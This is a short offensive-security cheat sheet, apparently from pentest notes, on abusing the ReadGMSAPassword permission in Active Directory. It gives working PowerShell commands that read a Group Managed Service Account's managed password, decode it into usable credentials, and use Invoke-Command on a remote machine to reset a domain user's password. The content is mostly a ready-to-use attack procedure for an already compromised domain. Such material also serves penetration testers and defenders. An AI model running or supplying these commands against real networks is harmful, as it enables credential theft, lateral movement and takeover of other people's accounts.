# Group Managed Service Accounts
Retrieve passwords from Group Managed Service Accounts (GMSA) that you have ReadGMSAPassword permissions over.

If the user you have owned has ReadGMSAPassword permissions over a GMSA you are able to retreive this users password.

```powershell
$gmsa = Get-ADServiceAccount -Identity 'GMSA-USER' -Properties 'msDS-ManagedPassword'
$mp = $gmsa.'msDS-ManagedPassword'

ConvertFrom-ADManagedPasswordBlob $mp
```

You can either obtain and reuse the plaintext password or invoke commands as the GMSA.

```powershell
# Create credential object.
$cred = new-object system.management.automation.PSCredential "DOMAIN\GMSA-USER",(ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
```

Execute commands via `Invoke-Command` as GMSA.

```powershell
Invoke-Command -ComputerName COMPUTER_NAME -Credential $cred -ScriptBlock {net user someuser password123! /domain}
```
